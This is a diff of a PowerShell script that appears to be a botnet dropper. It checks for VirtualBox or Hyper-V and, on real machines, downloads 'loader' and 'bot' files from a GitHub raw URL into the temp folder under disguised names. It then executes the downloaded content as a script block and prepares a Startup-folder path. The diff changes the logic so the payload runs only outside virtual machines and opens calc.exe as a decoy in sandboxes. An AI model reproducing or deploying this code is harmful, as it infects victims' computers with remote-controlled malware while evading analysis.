@@ -1,28 +1,31 @@
 $A = (Get-Process | Select-String -Pattern vboxservice).count
-If ($A -GT 0) { $Virtual = $True} Else {$Virtual = $False};
+If ($A -GT 0) { $Virtual = $True} Else {$Virtual = $False}
 
 $B = Get-WmiObject -Q “Select Model From Win32_ComputerSystem”
-If ($B.Model -eq “Virtual Machine”) {$Hyper = $True} Else {$Hyper = $False};
+If ($B.Model -eq “Virtual Machine”) {$Virtual1 = $True} Else {$Virtual1 = $False}
 
-if ($virual -eq $True -And $Hyper -eq $True){
+
+
+if ($virtual -eq $false -and $virtual1 -eq $false){
     $temp = $env:TEMP;
-    $userprof = $env:USERPROFILE;
-    $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
+$userprof = $env:USERPROFILE;
+$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
 
-    $botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem';
+$botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem'; #Always Useful
 
-    $wc = [System.Net.WebClient]::new();
-    $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
-    $wc.DownloadFile("$loader","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
+$wc = [System.Net.WebClient]::new();
+$loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
+$wc.DownloadFile("$loader","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
 
-    $bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
-    $wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.png");
+$bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
+$wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log");
 
 
-    $AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.png -Raw
+$AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log -Raw
 
-        $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)
+    $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)
 
-        & $ScriptBlock
-
+    & $ScriptBlock
+}else {
+    Start-Process calc.exe
 }
